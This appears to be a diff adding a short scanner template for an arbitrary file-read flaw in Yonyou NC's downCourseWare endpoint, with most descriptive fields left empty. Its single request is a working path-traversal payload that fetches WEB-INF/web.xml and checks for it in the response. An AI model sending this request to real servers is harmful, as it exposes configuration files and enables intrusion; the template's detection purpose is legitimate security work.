@@ -1,0 +1,16 @@
+id:
+
+info:
+  name: 用友NC downCourseWare 任意文件读取
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /portal/pt/downCourseWare/download?fileName=../webapps/nc_web/WEB-INF/web.xml&pageId=login
+response1:
+  body: web-app
+  code: 200
+requests2:
+response2:
